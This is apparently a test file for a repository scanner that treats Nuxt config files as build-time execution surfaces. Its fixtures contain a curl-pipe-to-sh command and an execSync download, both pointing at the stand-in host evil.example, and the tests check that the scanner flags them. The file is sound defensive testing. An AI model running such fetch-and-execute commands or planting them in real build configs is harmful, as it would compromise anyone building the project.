import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Nuxt config is an install surface", () => {
  // Nuxt loads nuxt.config.<ext> at dev and build time through c12,
  // which imports the file with jiti in every spelling it looks up —
  // build-time execution in the same sense the Jenkinsfile and the
  // Makefiles already classify for. It keeps the source surface it
  // already had; the name alone decides, for every spelling the
  // loader accepts and wherever the project root sits.
  for (const path of [
    "nuxt.config.ts",
    "nuxt.config.js",
    "nuxt.config.mjs",
    "nuxt.config.cjs",
    "nuxt.config.mts",
    "packages/app/nuxt.config.cts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.json` spelling is not one of them: c12 resolves it too, but
  // parses it as data instead of importing it, so it stays source
  // alone.
  expect(surfacesOf("nuxt.config.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("nuxt.config.ts", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["nuxt.config.ts:unsafe-execution:high"]);
});

test("an install-time download inside a Nuxt config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Nuxt would have run while building.
  const inspection = inspected(
    "nuxt.config.ts",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default defineNuxtConfig({});\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Nuxt config keeps no finding", () => {
  const inspection = inspected(
    "nuxt.config.ts",
    "export default defineNuxtConfig({ compatibilityDate: '2026-01-01' });\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
